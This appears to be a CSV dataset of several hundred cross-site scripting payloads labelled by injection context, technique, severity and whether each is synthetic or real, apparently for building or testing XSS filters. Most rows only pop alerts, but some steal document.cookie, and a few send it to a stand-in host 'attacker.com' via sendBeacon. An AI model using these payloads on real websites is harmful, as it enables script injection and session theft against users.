payload,context,technique,severity,length,source
&quOt; onPoiNteRovEr=ConFirM(lOcaTioN.hAsh) x=&qUot;,attribute_escape,synthetic,medium,52,synthetic
"%22 ><svg onanimationcancel=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,65,synthetic
"javascript:`</template>\""///""//</script/--></title/'</style/</textarea/</noembed/</noscript><<script/>/<frame */; onload=alert()//<</script>`",script_injection,none,medium,141,real
"' onanimationstart=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,62,synthetic
<scRipT sRc=X oNdbLclIck=prOmpT(1)>,tag_injection,synthetic,medium,35,synthetic
"<link onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</link>",tag_injection,none,medium,70,real
\%27 onfullscreenchange=console.log(1)//,attribute_escape,synthetic,medium,40,synthetic
"<a href=""\x0Cjavascript:javascript:alert(7355)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<style>:target {color:red;}</style><a2 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></a2>",tag_injection,none,medium,104,real
<blink src=x onpopstate=console.log(document.domain)>,tag_injection,synthetic,medium,53,synthetic
(new Function(%22alert(document.cookie+%27&loc=%27+location.href)%22))();,dom_sink,synthetic,high,73,synthetic
\%27 ondrop=confirm(location.hash)//,attribute_escape,synthetic,medium,36,synthetic
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=eVal(loCatIon.haSh)>"")",dom_sink,synthetic,low,81,synthetic
ongestureend=javascript:confirm('XSS'),event_handler,synthetic,medium,38,synthetic
%22 ><svg onplay=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,36,synthetic
onpointercancel=prompt/**/(location.hash),event_handler,synthetic,low,41,synthetic
"__pRotO__[""oNpaGesHow""]=EvaL(dOcuMenT.cOokIe)",dom_sink,synthetic,high,45,synthetic
location=%22javascript:eval(location.hash)%22,dom_sink,synthetic,high,45,synthetic
%3Cdialog onended=console.log(1) onended=console.log(1)%3E,tag_injection,synthetic,medium,58,synthetic
%3Cembed onmozfullscreenchange=console.log(document.domain)%3E,tag_injection,synthetic,medium,62,synthetic
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></button>",tag_injection,none,medium,116,real
<animatemotion onanimationiteration=console.log('XSS')>,tag_injection,synthetic,medium,55,synthetic
"<div onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</div>",tag_injection,none,medium,67,real
' oNbeForEinPut=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,46,synthetic
%22 ><svg onpointerdown=console.log(document.domain)>,attribute_escape,synthetic,medium,53,synthetic
"<col onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</col>",tag_injection,none,medium,81,real
<scr	ipt>/*/alert('XSS')</scr	ipt>,script_injection,synthetic,medium,34,synthetic
onpointermove=confirm('XSS'),event_handler,synthetic,medium,28,synthetic
"document.write(""<img src=x onerror=eval(document.domain)>"")",dom_sink,synthetic,low,59,synthetic
"<script
>alert(location.hash)</script>",script_injection,synthetic,medium,38,synthetic
""" ><svG oNwhEel=coNsoLe.Log(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,45,synthetic
	onDraGstArt=coNfiRm(1),event_handler,synthetic,medium,23,synthetic
"setInterval(%22console.log(document.domain)%22,100)",dom_sink,synthetic,high,51,synthetic
%22><img src=x onblur=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,40,synthetic
""" onanimationcancel=console.log(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,64,synthetic
"<style>@keyframes slidein {}</style><ol style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></ol>",tag_injection,none,medium,164,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dd>",tag_injection,none,medium,174,real
"onpointercancel=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,54,synthetic
<header onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,68,real
"<noscript
onpointerdown=prompt(document.domain)>",tag_injection,synthetic,medium,48,synthetic
"<applet onmouseenter=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,54,real
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:f&#101;tch(docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,low,81,synthetic
"<code draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</code>",tag_injection,none,medium,64,real
oncanplay=javascr	ipt:confirm(1),event_handler,synthetic,medium,32,synthetic
	onanimationend=console.log('XSS'),event_handler,synthetic,medium,34,synthetic
"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable style=display:block>drop here</dir>",tag_injection,none,medium,127,real
"location=""javascript:console.log(String.fromCharCode(88,83,83))""",dom_sink,synthetic,high,64,synthetic
`><img src=x onwh&#101;&#101;l=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,medium,61,synthetic
JavAscRipT:vOid(alErt(1)),js_uri,synthetic,medium,25,synthetic
"""><img\ src=x\ onerror=prompt(document.domain);>",dom_sink,none,medium,48,real
"\"" onpl&#97;ying=confirm(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,medium,66,synthetic
"location.href=""javascr	ipt:confirm(document.cookie)""",dom_sink,synthetic,high,52,synthetic
"&quOt; onWaiTinG=pRomPt(StrIng.frOmCHarCodE(88,83,83)) x=&quOt;",attribute_escape,synthetic,high,63,synthetic
<script id=x tabindex=1 onbeforeactivate=alert(1)></script>,script_injection,none,medium,59,real
<!--><TabLe OnsEleCt=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,46,synthetic
"<body onunload=""javascript:alert('XSS');"">",js_uri,none,medium,42,real
"<!--><Xmp onFocUsoUt=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,59,synthetic
""" onkeydown=\u0061lert('XSS') """,attribute_escape,synthetic,low,31,synthetic
"<kbd onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",tag_injection,none,medium,65,real
"' ons&#101;l&#101;ct=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,69,synthetic
"<footer oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
"<wbr draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</wbr>",tag_injection,none,medium,59,real
OnkEypResS=cOnsOle.loG(1),event_handler,synthetic,medium,25,synthetic
"""><Img srC=x onSeaRch=prOmpT(lOcaTioN.hAsh)>",attribute_escape,synthetic,medium,44,synthetic
"<footer onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></footer>",tag_injection,none,medium,285,real
"<rt id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></rt>",tag_injection,none,medium,80,real
<!--><blink onpopst&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,75,synthetic
onchange=\u0061lert(document.domain),event_handler,synthetic,low,36,synthetic
' ><svg onpagehide=alert(location.hash)>,attribute_escape,synthetic,medium,40,synthetic
<svg src=x onpromptdismiss=\u0061lert(location.hash)>,tag_injection,synthetic,low,53,synthetic
%27 onwaiting=confirm(document.domain) %27,attribute_escape,synthetic,medium,42,synthetic
<%= alert 'XSS' %>,template_injection,synthetic,low,18,synthetic
`><img src=x ondrop=&#97;l&#101;rt('XSS')>,attribute_escape,synthetic,low,42,synthetic
OniNpuT=aLerT&#40;1&#41;,event_handler,synthetic,low,24,synthetic
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",js_uri,none,medium,96,real
&amp;amp;lt;img src=1 onerror=alert(1)&amp;amp;gt;,event_handler,none,medium,50,real
<content onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</content><input value=clickme>,tag_injection,none,medium,105,real
"__proto__[""onclick""]=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink,synthetic,medium,68,synthetic
"<style>:target {transform: rotate(180deg);}</style><mark id=x style=""transition:transform 2s"" ontransitionrun=print()></mark>",tag_injection,none,low,125,real
"""><img src=""javascript:alert(1);"" />",js_uri,none,medium,36,real
onpaste=\u0061lert(1),event_handler,synthetic,low,21,synthetic
%3Cscript	%3Econfirm(location.hash)%3C/script%3E,script_injection,synthetic,medium,48,synthetic
{{cOnfIrm(1)}},template_injection,synthetic,medium,14,synthetic
"<hr draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",tag_injection,none,medium,80,real
"\"" onclos&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,74,synthetic
""" %3E%3Csvg onpointerover=confirm(location.hash)%3E",attribute_escape,synthetic,medium,51,synthetic
%3Canimatetransform onpointerdown=prompt(1)/%3E,tag_injection,synthetic,medium,47,synthetic
"<img src=x\x12onerror=""javascript:alert(1)"">",js_uri,none,medium,44,real
OnkEydOwn=coNfiRm/***/(1),event_handler,synthetic,low,25,synthetic
"<div id=""127""><svg xmlns=""http://www.w3.org/2000/svg"" id=""x"">",attribute_escape,none,low,61,real
\' onscrollsnapchange=alert('XSS')//,attribute_escape,synthetic,medium,36,synthetic
%27 ongestureend=console.log(location.hash) %27,attribute_escape,synthetic,medium,47,synthetic
`><Img srC=x onCopY=cOnsOle.loG(1)>,attribute_escape,synthetic,medium,35,synthetic
<diAloG sRc=X oNplAy=ProMpt(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,45,synthetic
 onk&#101;ydown=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,58,synthetic
"<style>@keyframes x{}</style><link style=""animation-name:x"" onanimationend=""alert(1)""></link>",tag_injection,none,medium,93,real
<address contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,61,real
"<details onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</details>",tag_injection,none,medium,73,real
"<time onmouseenter=""alert(1)"">AnonKryptiQuz</time>",tag_injection,none,medium,50,real
<scRipT	>ConSolE.lOg('XSS')</sCriPt>,script_injection,synthetic,medium,36,synthetic
	onCanPlaY=cOnfIrm(1),event_handler,synthetic,medium,21,synthetic
onend=javascript:console.log(1),event_handler,synthetic,medium,31,synthetic
#prOmpT(dOcuMenT.cOokIe),template_injection,synthetic,high,24,synthetic
"JAVASCRIPT:cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))",js_uri,synthetic,high,53,synthetic
%27><img src=x onpageshow=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,49,synthetic
"window[""&#101;v&#97;l""](docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)",dom_sink,synthetic,low,81,synthetic
<animatemotion ongesturestart=confirm(1) ongesturestart=confirm(1)>,tag_injection,synthetic,medium,67,synthetic
"<big draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</big>",tag_injection,none,medium,83,real
<object onanimationcancel=alert(document.domain)/>,tag_injection,synthetic,medium,50,synthetic
"<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
OnhAshChaNge=coNsoLe.Log&#40;lOcaTioN.hAsh&#41;,event_handler,synthetic,low,47,synthetic
&lt;img src=# onerror=alert(1)&gt;,event_handler,none,medium,34,real
"a<%00meta name=""i"" HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/h%00tml;base64,PHNjcmlwdD5hbGVydCgiT1BFTkJVR0JPVU5UWSIpOzwvc2NyaXB0Pg=="">",attribute_escape,url_encoding,low,138,real
<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>,tag_injection,none,medium,71,real
%22 ><svg onend=prompt(location.hash)>,attribute_escape,synthetic,medium,38,synthetic
"setTimeout(""XMLHttpRequest(document.domain)"",0)",dom_sink,synthetic,high,47,synthetic
"<meter draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",tag_injection,none,medium,87,real
"<time onmouseout=""alert(1)"">AnonKryptiQuz</time>",tag_injection,none,medium,48,real
"<small onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</small>",tag_injection,none,medium,69,real
<custom tags onpointerout=alert(1) style=display:block>AnonKryptiQuz</custom tags>,tag_injection,none,medium,82,real
onwheel=prompt(1),event_handler,synthetic,medium,17,synthetic
`><img src=x onb&#101;for&#101;p&#97;st&#101;=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,64,synthetic
""" ><svG oNclOse=alErt(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,39,synthetic
""" ontransitionend=\u0061lert(1) """,attribute_escape,synthetic,low,33,synthetic
	onAniMatIonCanCel=prOmpT(lOcaTioN.hAsh),event_handler,synthetic,medium,40,synthetic
onfocus=javascript:\u0061lert(location.hash),event_handler,synthetic,low,44,synthetic
%22><img src=x onstalled=prompt(1)>,attribute_escape,synthetic,medium,35,synthetic
<div style=xss:expressio\006e(alert(1))>,generic,none,medium,40,real
OnpOinTerDowN=pRomPt(1),event_handler,synthetic,medium,23,synthetic
OneNd=ProMpt/*x*/(1),event_handler,synthetic,low,20,synthetic
""" %3E%3Csvg onpromptdismiss=prompt(document.domain)%3E",attribute_escape,synthetic,medium,54,synthetic
"<ruby oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,98,real
<tr	onAniMatIonEnd=prOmpT('XSS')>,tag_injection,synthetic,medium,33,synthetic
"<tt oncontextmenu=""alert(1)"">AnonKryptiQuz</tt>",tag_injection,none,medium,47,real
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>",tag_injection,none,medium,109,real
 onPagEreVeaL=cOnfIrm(doCumEnt.doMaiN),event_handler,synthetic,medium,38,synthetic
"{{c='%27%27.sub.call;b='%27%27.sub.bind;a='%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync('alert(document.domain)');m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a='%27%27.sub;$eval('a(b.c)'):[].push.apply=a:}}",template_injection,encoding|url_encoding,medium,391,real
<video ondragstart=alert(%27XSS%27) ondragstart=alert(%27XSS%27)>,tag_injection,synthetic,medium,65,synthetic
"%3C!--%3E%3Ctemplate onbegin=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,68,synthetic
"<style>@keyframes x{}</style><dfn style=""animation-name:x"" onanimationstart=""alert(1)""></dfn>",tag_injection,none,medium,93,real
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>"")",dom_sink,synthetic,low,167,synthetic
"<script\x20type=""text/javascript"">javascript:alert(9535);</script>",script_injection,none,medium,66,real
"java	scr	ipt:console.log(String.fromCharCode(88,83,83))",js_uri,synthetic,high,55,synthetic
"<form onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</form>",tag_injection,none,medium,61,real
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",tag_injection,none,medium,101,real
"<keygen onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</keygen>",tag_injection,none,medium,87,real
${prompt?new()(%27document.cookie%27)},template_injection,synthetic,high,38,synthetic
"&#101;v&#97;l(""&#101;v&#97;l(loc&#97;tion.h&#97;sh)"")",dom_sink,synthetic,low,53,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onblur"":f&#101;tch})",dom_sink,synthetic,low,52,synthetic
' ><svG oNpaSte=coNfiRm('XSS')>,attribute_escape,synthetic,medium,31,synthetic
 ondblclick=consol&#101;.log(1),event_handler,synthetic,low,31,synthetic
\%27 onfocusout=confirm(location.hash)//,attribute_escape,synthetic,medium,40,synthetic
	onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,54,synthetic
%27 onerror=console.log(document.domain) %27,attribute_escape,synthetic,medium,44,synthetic
""" %3E%3Csvg onfocusout=console.log(location.hash)%3E",attribute_escape,synthetic,medium,52,synthetic
"<div draggable=""true"" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>",tag_injection,none,medium,109,real
"<blink draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</blink>",tag_injection,none,medium,68,real
"<applet draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</applet>",tag_injection,none,medium,65,real
document.write(%22<img src=x onerror=fetch(1)>%22),dom_sink,synthetic,high,50,synthetic
""" ><svG oNloAd=AleRt(1)>",attribute_escape,synthetic,medium,24,synthetic
""" oNmoUseOveR=cOnsOle.loG('XSS') X=""",attribute_escape,synthetic,medium,36,synthetic
<SCRIPT>confirm('XSS')</SCRIPT>,script_injection,synthetic,medium,31,synthetic
"""><img src=x oncopy=confirm('XSS')>",attribute_escape,synthetic,medium,35,synthetic
""" ><svG oNgeStuReeNd=ProMpt(1)>",attribute_escape,synthetic,medium,31,synthetic
&quOt; onTouChmOve=alErt(loCatIon.haSh) x=&quOt;,attribute_escape,synthetic,medium,48,synthetic
ontransitionrun=confirm(1),event_handler,synthetic,medium,26,synthetic
&quot; onpointerover=console.log(%27XSS%27) x=&quot;,attribute_escape,synthetic,medium,52,synthetic
"document.querySelector(""body"").innerHTML+=""\u0061lert(document.domain)""",dom_sink,synthetic,high,71,synthetic
\%22 ontouchend=console.log(%27XSS%27)//,attribute_escape,synthetic,medium,40,synthetic
"&quot; ondragover=console.log(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,69,synthetic
<noscript onp&#97;st&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,58,synthetic
""" ><svg ongotpointercapture=confirm(location.hash)>",attribute_escape,synthetic,medium,51,synthetic
<buTtoN	oNdrAgeNteR=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,41,synthetic
%3C!--%3E%3Carea onpointercancel=console.log(document.domain)%3E,tag_injection,synthetic,medium,64,synthetic
"%3Cp	onbeforetoggle=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,59,synthetic
"<progress onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</progress>",tag_injection,none,medium,77,real
"<figure draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,90,real
""" oNtrAnsItiOneNd=ProMpt(loCatIon.haSh) """,attribute_escape,synthetic,medium,41,synthetic
"<summary onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,75,real
eval(%22confirm(document.cookie)%22),dom_sink,synthetic,high,36,synthetic
"\"" OntOucHstArt=coNfiRm('XSS')//",attribute_escape,synthetic,medium,32,synthetic
"JAVASCRIPT:confirm(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,medium,58,synthetic
"<input type=text value=jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e></input>",js_uri,comment_injection|url_encoding,medium,176,real
' ><svg ongestureend=prompt(1)>,attribute_escape,synthetic,medium,31,synthetic
"<ifr&#97;m&#101;
ong&#101;stur&#101;&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,low,102,synthetic
\%22 onended=prompt(document.domain)//,attribute_escape,synthetic,medium,38,synthetic
""" ><svg onpointermove=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,59,synthetic
"location.href=""javascr	ipt:console.log(String.fromCharCode(88,83,83))""",dom_sink,synthetic,high,70,synthetic
<col onpointerleave=alert(1) style=display:block>AnonKryptiQuz</col>,tag_injection,none,medium,68,real
<di&#97;log onp&#97;g&#101;hid&#101;=consol&#101;.log(1) onp&#97;g&#101;hid&#101;=consol&#101;.log(1)>,tag_injection,synthetic,low,102,synthetic
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""alErt(StRinG.fRomChaRCoDe(88,83,83))""",dom_sink,synthetic,high,80,synthetic
ondragover=javascript:prompt(document.domain),event_handler,synthetic,medium,45,synthetic
<header onpointerenter=alert(1) style=display:block>AnonKryptiQuz</header>,tag_injection,none,medium,74,real
"""><vid&#101;o onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')>",tag_injection,synthetic,medium,69,synthetic
<video src=x onclick=console.log(%27XSS%27)>,tag_injection,synthetic,medium,44,synthetic
"<SCRIPT>pRomPt(StrIng.frOmCHarCodE(88,83,83))</SCRIPT>",script_injection,synthetic,high,54,synthetic
"<embed ondblclick=""alert(1)"">AnonKryptiQuz</embed>",tag_injection,none,medium,50,real
"onkeydown=javascript:alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,57,synthetic
<nav onpointerleave=alert(1) style=display:block>AnonKryptiQuz</nav>,tag_injection,none,medium,68,real
"<a href=""about:<script>document.vulnerable=true;</script>"">",dom_sink,none,low,59,real
' ><svg ongesturestart=alert(1)>,attribute_escape,synthetic,medium,32,synthetic
<!--><tr on&#97;nim&#97;tion&#101;nd=prompt('XSS')>,tag_injection,synthetic,medium,51,synthetic
"""><svg/onload=confirm(1)>""@x.y",tag_injection,none,medium,30,real
onplaying=javascript:\u0061lert(1),event_handler,synthetic,low,34,synthetic
<diV sRc=X oNpaUse=coNfiRm(LocAtiOn.HasH)>,tag_injection,synthetic,medium,42,synthetic
<script>+-+-1-+-+alert(4141)</script>,script_injection,none,medium,37,real
&quOt; onPoiNteRup=alErt(1) x=&quOt;,attribute_escape,synthetic,medium,36,synthetic
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;,js_uri,none,medium,49,real
"<style>:target {transform: rotate(180deg);}</style><bdi id=x style=""transition:transform 2s"" ontransitionrun=print()></bdi>",tag_injection,none,low,123,real
<nobr onpointerout=alert(1) style=display:block>AnonKryptiQuz</nobr>,tag_injection,none,medium,68,real
"<scr	ipt>setTimeout('console.log(1)',0)</scr	ipt>",script_injection,synthetic,medium,49,synthetic
"setTimeout(%22eval(document.cookie+%27&loc=%27+location.href)%22,0)",dom_sink,synthetic,high,67,synthetic
"<a href=""\x08javascript:javascript:alert(6145)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<div draggable=""true"" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>",tag_injection,none,medium,109,real
"onmous&#101;wh&#101;&#101;l=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,93,synthetic
"<area
onpointercancel=console.log(document.domain)>",tag_injection,synthetic,medium,51,synthetic
"%22><img src=x onfocus=console.log(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
%27><img src=x onbeforematch=confirm(location.hash)>,attribute_escape,synthetic,medium,52,synthetic
"\"" onmousewheel=\u0061lert(1)//",attribute_escape,synthetic,low,31,synthetic
<taBle x=Y oNseLecT=pRomPt(1)>,tag_injection,synthetic,medium,30,synthetic
"<rp onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></rp>",tag_injection,none,medium,277,real
"\"" onpromptdismiss=prompt(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,medium,50,synthetic
<meta src=x ontransitionstart=alert(location.hash)>,tag_injection,synthetic,medium,51,synthetic
"<style>@keyframes x{}</style><animate style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></animate>",tag_injection,none,medium,107,real
"<article draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</article>",tag_injection,none,medium,87,real
""";alert(123);t=""",attribute_escape,none,medium,16,real
OnsEleCt=ProMpt&#40;lOcaTioN.hAsh&#41;,event_handler,synthetic,low,38,synthetic
"__proto__[""ongesturestart""]=fetch(document.domain)",dom_sink,synthetic,high,50,synthetic
"\"" OnbEfoReiNpuT=cOnsOle.loG('XSS')//",attribute_escape,synthetic,medium,37,synthetic
%3Cscript	onkeydown=confirm(document.domain)%3E,tag_injection,synthetic,medium,47,synthetic
OncHanGe=AleRt(DocUmeNt.DomAin),event_handler,synthetic,medium,31,synthetic
"<acronym ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</acronym>",tag_injection,none,medium,95,real
&quot; onscrollsnapchange=alert(1) x=&quot;,attribute_escape,synthetic,medium,43,synthetic
"<style>@keyframes x{}</style><video2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></video2>",tag_injection,none,medium,103,real
"<small onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</small>",tag_injection,none,medium,70,real
&quOt; onMouSeoVer=prOmpT(1) x=&qUot;,attribute_escape,synthetic,medium,37,synthetic
"""^prompt(9)^""",attribute_escape,none,medium,13,real
"__pRotO__[""oNseCurItyPolIcyVioLatIon""]=AleRt(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))",dom_sink,synthetic,high,100,synthetic
"%3Cscript
%3Eprompt(1)%3C/script%3E",script_injection,synthetic,medium,35,synthetic
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationend=""alert(1)""></abbr>",tag_injection,none,medium,93,real
<SCRIPT>prompt(%27XSS%27)</SCRIPT>,script_injection,synthetic,medium,34,synthetic
<i onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</i><input value=clickme>,tag_injection,none,medium,93,real
%22 oncut=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,32,synthetic
"s&#101;tTim&#101;out(""consol&#101;.log('XSS')"",0)",dom_sink,synthetic,low,49,synthetic
"location.href=""javascr	ipt:prompt(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink,synthetic,high,90,synthetic
&quot; onwaiting=confirm(document.domain) x=&quot;,attribute_escape,synthetic,medium,50,synthetic
<svg><menuitem onload=alert(1)></menuitem>,tag_injection,none,medium,42,real
%3Ctd src=x onstalled=confirm('XSS')%3E,tag_injection,synthetic,medium,39,synthetic
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,tag_injection,none,medium,55,real
"<sub onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",tag_injection,none,medium,65,real
"<wbr id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></wbr>",tag_injection,none,medium,82,real
__proto__[%22onkeyup%22]=console.log(btoa(document.cookie)),dom_sink,synthetic,high,59,synthetic
"<maTh
OnpLayIng=coNsoLe.Log('XSS')>",tag_injection,synthetic,medium,35,synthetic
	onPoiNteRmoVe=ConSolE.lOg(1),event_handler,synthetic,medium,29,synthetic
' ><svg ontransitionstart=confirm(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
